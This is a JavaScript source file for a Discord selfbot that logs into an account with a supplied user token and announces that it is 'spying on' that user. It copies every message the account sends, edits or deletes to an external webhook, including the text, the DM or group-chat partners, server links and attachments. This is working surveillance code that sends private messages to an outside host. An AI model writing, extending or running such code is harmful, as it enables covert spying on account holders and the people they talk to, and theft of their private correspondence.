const { Client } = require("discord.js-selfbot-v13");
require("dotenv").config();

const token = process.env.TOKEN;
const webhook = process.env.WEBHOOK;

const client = new Client();

// When the bot is ready
client.once("ready", () => {
  const message = `Now spying on ${client.user.tag}`;
  console.log(message);

  sendWebhook("Setup Successful", message, [], COLORS.setup);
});

// When a message is created
client.on("messageCreate", async (message) => {
  if (message.author.id !== client.user.id) return;

  const messageChannel = getMessageChannelInfo(message);
  const { fields, imageUrl } = getAttachmentsInfo(message);

  const embedFields = [
    { name: "Message", value: message.content || "No content", inline: false },
    { name: "Channel", value: messageChannel, inline: false },
    ...fields,
  ];

  sendWebhook("New Message", null, embedFields, COLORS.create, imageUrl);
});

// When a message is deleted
client.on("messageDelete", async (message) => {
  if (!message.author) return;
  if (message.author.id !== client.user.id) return;

  const messageChannel = getMessageChannelInfo(message);
  const { fields, imageUrl } = getAttachmentsInfo(message);

  const embedFields = [
    {
      name: "Deleted Message",
      value: message.content || "No content",
      inline: false,
    },
    { name: "Channel", value: messageChannel, inline: false },
    ...fields,
  ];

  sendWebhook("Message Deleted", null, embedFields, COLORS.delete, imageUrl);
});

// When a message is edited
client.on("messageUpdate", async (oldMessage, newMessage) => {
  if (!oldMessage.author || !newMessage.author) return;
  if (oldMessage.author.id !== client.user.id) return;

  const messageChannel = getMessageChannelInfo(oldMessage);
  const { fields, imageUrl } = getAttachmentsInfo(newMessage);

  const embedFields = [
    {
      name: "Old Message",
      value: oldMessage.content || "No content",
      inline: false,
    },
    {
      name: "New Message",
      value: newMessage.content || "No content",
      inline: false,
    },
    { name: "Channel", value: messageChannel, inline: false },
    ...fields,
  ];

  sendWebhook("Message Edited", null, embedFields, COLORS.edit, imageUrl);
});

client.login(token);

// HELPER FUNCTIONS:
const COLORS = {
  setup: 3066993, // Green
  create: 3447003, // Blue
  edit: 16776960, // Yellow
  delete: 15158332, // Red
};

// Function to send a webhook message with customizable color and image URL
const sendWebhook = async (
  title,
  description,
  fields = [],
  color = 3447003,
  imageUrl = null
) => {
  try {
    const embed = {
      title,
      description,
      color,
      fields,
    };

    if (imageUrl) {
      embed.image = { url: imageUrl };
    }

    await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: client.user.username,
        avatar_url: client.user.displayAvatarURL(),
        embeds: [embed],
      }),
    });
  } catch (error) {
    console.log("[ ERROR ] Failed to send webhook:", error.message);
  }
};

// Function to determine the message channel
const getMessageChannelInfo = (message) => {
  if (message.channel.type === "DM") {
    return `In a DM with ${message.channel.recipient.tag}`;
  }

  if (message.channel.type === "GROUP_DM") {
    const recipients = message.channel.recipients
      .filter((user) => user.id !== client.user.id)
      .map((user) => user.tag)
      .join(",\n");
    return `**In a groupchat with:**\n${recipients}`;
  }

  return `In the server ${message.guild.name} | [message link](https://discord.com/channels/${message.guild.id}/${message.channel.id}/${message.id})`;
};

// Function to get attachment info and embed an image if it is an image file
const getAttachmentsInfo = (message) => {
  const attachments = message.attachments.filter(
    (attachment) => attachment.size <= 25 * 1024 * 1024 // Only handle attachments under 25MB
  );

  let fields = [];
  let imageUrl = null;

  attachments.forEach((attachment) => {
    const fileType = attachment.contentType || attachment.name.split(".").pop();

    // Common image or media types
    const mediaTypes = [
      "image/png",
      "image/jpeg",
      "image/gif",
      "image/webp",
      "video/mp4",
      "video/webm",
      "image/svg+xml",
    ];

    if (
      mediaTypes.includes(attachment.contentType) ||
      /\.(png|jpe?g|gif|mp4|webm)$/.test(attachment.name)
    ) {
      imageUrl = attachment.url;
    } else {
      fields.push({
        name: "Attachment",
        value: `[${attachment.name}](${attachment.url})`,
        inline: false,
      });
    }
  });

  return { fields, imageUrl };
};
